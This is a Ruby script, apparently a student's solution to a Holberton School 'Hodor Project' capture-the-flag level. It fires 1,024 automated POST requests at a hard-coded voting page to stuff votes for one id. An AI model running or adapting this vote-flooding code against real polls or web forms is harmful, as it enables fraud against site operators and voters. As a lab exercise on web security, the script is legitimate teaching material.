#!/usr/bin/env ruby

require 'uri'
require 'net/http'

=begin <= Ruby multiline comment
===---Description---------------------------------------------------------------===
# Solution for the Hodor Project, Level 0 by Julien Barbier.
# Using Ruby Language.
# by Alexandro de Oliveira, for Holberton School
===-----------------------------------------------------------------------------===
=end

# Parsing the URL:
uri = URI.parse("http://173.246.108.142/level0.php")
# Setting the http request:
http = Net::HTTP.new(uri.host, uri.port)
# Setting the http request headers:
headers = {
    'User-Agent' => 'Ruby Script - Alexandro de Oliveira',
    'Content-Type' => 'application/x-www-form-urlencoded'
}
# Setting POST request parameters:
params = URI.encode_www_form({
    'id' => "23",
    'holdthedoor' => "submit"
})
# Processing the POST requests:
votes = 0 # A vote counter
(1 << 10).times {  # This result of this bitwise operatation(1 << 10) is "1024"
    resp, data = http.post(uri.path, params, headers)
    unless resp.message != 'OK'
        puts "Vote number: #{votes += 1}"
        # Optionally printing the response object hash:
        #puts "Headers: #{resp.to_hash.inspect}"
    else
        puts "Connection error, vote not computed..."
    end
}
